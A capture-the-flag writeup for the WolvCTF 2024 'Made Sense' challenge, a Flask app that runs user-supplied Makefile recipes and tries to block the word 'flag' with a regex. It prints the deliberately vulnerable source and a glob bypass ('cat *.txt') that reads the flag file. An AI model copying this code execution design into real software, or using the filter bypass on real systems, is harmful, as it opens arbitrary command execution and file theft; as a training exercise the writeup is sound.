---
title: "Made Sense - WolvCTF 2024"
category: "misc"
type: "writeup"
tags: ["misc", "jail", "makejail", "flask", "subprocess", "regex", "wolvctf", "wolvctf-2024", "2024", "ctf-writeup"]
summary: "\\- Tags: Misc, Makekjail, Jail"
source:
  name: "CTFtime writeup #38969"
  url: "https://ctftime.org/writeup/38969"
original_source: "https://github.com/archv1le/CTF-Write-Ups/blob/main/WolvCTF%202024/Made%20Sense/Solution.md"
ctf:
  name: "WolvCTF 2024"
  year: 2024
  challenge: "Made Sense"
---

## Metadata

- **CTF:** WolvCTF 2024
- **Task:** Made Sense
- **Author team:** r1p3rS
- **CTFtime tags:** misc, jail, makejail
- **CTFtime:** <https://ctftime.org/writeup/38969>
- **Original writeup:** <https://github.com/archv1le/CTF-Write-Ups/blob/main/WolvCTF%202024/Made%20Sense/Solution.md>

---
## Made Sense  
\- Tags: Misc, Makekjail, Jail  
\- Description: i couldn't log in to my server so my friend kindly spun up a server to let me test makefiles. at least, they thought i couldn't log in :P

## Solution  
\- When we visit that website, we can see there a link to source code of it.

```  
import os  
from pathlib import Path  
import re  
import subprocess  
import tempfile

from flask import Flask, request, send_file

app = Flask(__name__)  
flag = open('flag.txt').read()

def write_flag(path):  
with open(path / 'flag.txt', 'w') as f:  
f.write(flag)

def generate_makefile(name, content, path):  
with open(path / 'Makefile', 'w') as f:  
f.write(f"""  
SHELL := /bin/bash  
.PHONY: {name}  
{name}: flag.txt  
\t{content}  
""")

@app.route('/', methods=['GET'])  
def index():  
return send_file('index.html')

@app.route('/src/', methods=['GET'])  
def src():  
return send_file(__file__)

# made sense  
@app.route('/make', methods=['POST'])  
def make():  
target_name = request.form.get('name')  
code = request.form.get('code')

print(code)  
if not re.fullmatch(r'[A-Za-z0-9]+', target_name):  
return 'no'  
if '\n' in code:  
return 'no'  
if re.search(r'flag', code):  
return 'no'

with tempfile.TemporaryDirectory() as dir:  
run_dir = Path(dir)  
write_flag(run_dir)  
generate_makefile(target_name, code, run_dir)  
sp = subprocess.run(['make'], capture_output=True, cwd=run_dir)  
return f"""  
<h1>stdout:</h1>  
{sp.stdout}  
<h1>stderr:</h1>  
{sp.stderr}  
"""

app.run('localhost', 8000)  
```

\- This code below is used to check what we are entering to create a Makefile.

```  
if not re.fullmatch(r'[A-Za-z0-9]+', target_name):  
return 'no'  
if '\n' in code:  
return 'no'  
if re.search(r'flag', code):  
return 'no'  
```

\- We can't enter "flag" and we have to bypass this system to get the flag. First, what's comes to mind: enter some random letters into the "Target name" field. Then, we can bypass the check, by entering this command.

```  
cat *.txt  
```

\- This will open all the files within the directory. We don't explicitly enter "flag.txt", so the website is not yelling at us. There you will find a flag.

```  
wctf{m4k1ng_vuln3r4b1l1t135}  
```
